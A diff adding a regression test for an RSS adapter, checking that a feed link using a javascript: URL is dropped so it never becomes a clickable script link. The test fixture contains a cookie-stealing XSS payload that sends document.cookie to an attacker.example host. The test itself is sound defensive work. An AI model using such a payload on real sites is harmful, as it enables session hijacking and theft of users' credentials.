@@ -359,6 +359,39 @@ describe('RssAdapter', () => {
     expect(pages[0]!.records[0]!.extracted.name).toBe('Has a date');
   });
 
+  it('drops a non-http(s) <link> (e.g. javascript:) instead of setting url/evidenceUrl to it', async () => {
+    // Regression: a fresh review found evidenceUrl is rendered as a raw
+    // <a href> in src/ui/index.html. Nothing upstream of this adapter
+    // validates <link> is actually an http(s) URL -- a malicious or
+    // compromised feed publishing `<link>javascript:...</link>` would
+    // otherwise flow straight through to a clickable, script-executing
+    // link. The item itself is still kept (title/description are safe,
+    // rendered via textContent) -- only the unsafe url/evidenceUrl is
+    // dropped, not the whole record.
+    const xml = rssFeedXml(
+      rssItemXml({
+        title: 'Malicious Feed Item',
+        link: "javascript:fetch('https://attacker.example/exfil?c='+document.cookie)",
+        guid: 'guid-malicious',
+        pubDate: 'Thu, 13 Aug 2026 11:00:00 +0000',
+        description: 'still a legitimate-looking description',
+      }),
+    );
+    const fetchImpl: FetchLike = vi.fn(() => Promise.resolve(okResponse(xml)));
+    const adapter = new RssAdapter(fetchImpl, { feeds: [FEED_A] });
+
+    const pages = [];
+    for await (const page of adapter.fetch({ limit: 10, signal: new AbortController().signal })) {
+      pages.push(page);
+    }
+
+    expect(pages).toHaveLength(1);
+    const [record] = pages[0]!.records;
+    expect(record!.extracted.name).toBe('Malicious Feed Item');
+    expect(record!.extracted.url).toBeUndefined();
+    expect(record!.extracted.signals.some((s) => s.evidenceUrl)).toBe(false);
+  });
+
   it('stops once opts.limit is reached across multiple feeds', async () => {
     const feedXml = (title: string, guid: string) =>
       rssFeedXml(
